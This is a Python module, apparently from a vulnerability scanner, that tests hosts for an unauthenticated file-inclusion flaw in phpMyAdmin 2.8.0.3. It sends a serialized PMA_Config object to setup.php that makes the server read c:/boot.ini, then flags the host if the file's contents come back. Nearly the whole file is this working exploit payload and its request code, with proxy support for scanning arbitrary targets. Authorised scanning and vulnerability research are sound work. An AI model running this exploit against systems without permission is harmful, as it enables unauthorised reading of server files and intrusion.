#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PhpMyAdmin2.8.0.3无需登录任意文件包含导致代码执行
referer: http://www.mottoin.com/87915.html
author: Ascotbe
reference: Lucifer
description: 文件setup.php中,参数configuration经过序列化对象可导致文件包含漏洞。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "/scripts/setup.php"
post_data = {
    'configuration': 'O:10:"PMA_Config":1:{s:6:"source";s:11:"c:/boot.ini";}',
    'action': 'test'
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if  con.lower().find('boot loader')!=-1:
            Medusa = "{}存在PhpMyAdmin2.8.0.3无需登录任意文件包含导致代码执行漏洞(WINDOWS)\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass